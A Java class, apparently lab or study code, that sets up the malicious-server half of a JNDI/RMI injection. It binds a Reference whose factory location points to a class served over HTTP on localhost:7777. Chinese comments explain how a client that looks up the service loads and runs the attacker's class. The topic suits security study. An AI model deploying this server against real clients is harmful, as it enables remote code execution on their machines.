package com.endlessshw.server;

import com.endlessshw.common.impl.MyRemoteImpl;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2023/5/12 11:29
 */
public class JNDIRMIServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        // 这里在 RMIServer 中已经创建了注册中心，因此这里不用创建
        InitialContext initialContext = new InitialContext();
        // 然后由于 RMIServer 里面调用了 bind，因此这里要 rebind
        // initialContext.rebind("rmi://localhost:1099/myRemote", new MyRemoteImpl());
        // 这里需要注意，TestRef 这个类不能有包 package
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:7777/");
        initialContext.rebind("rmi://localhost:1099/myRemote", reference);
        // todo 漏洞成因：攻击客户端（目标），创建恶意服务端，指定恶意的 factoryLocation，将其引导到一个有恶意类的地方（这个恶意类和 factory 同名），那么客户端只要访问对应的 rmi 服务，就会触发漏洞。
    }
}
